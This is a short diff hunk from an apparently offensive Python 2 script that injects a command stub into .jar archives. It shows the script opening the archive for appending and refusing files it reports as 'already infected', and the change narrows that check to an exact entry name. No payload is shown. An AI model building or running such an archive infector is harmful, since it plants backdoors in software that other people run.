@@ -14,7 +14,7 @@ if len(sys.argv) != 3:
 command = sys.argv[2] # command we're going to be injecting
 zf = zipfile.ZipFile(sys.argv[1], 'a') # opening the .jar file
 
-if any(stub in x for x in zf.namelist()):
+if stub in zf.namelist():
 	print 'ERROR: file %s has already been infected' % sys.argv[1]
 	sys.exit(-1)
 
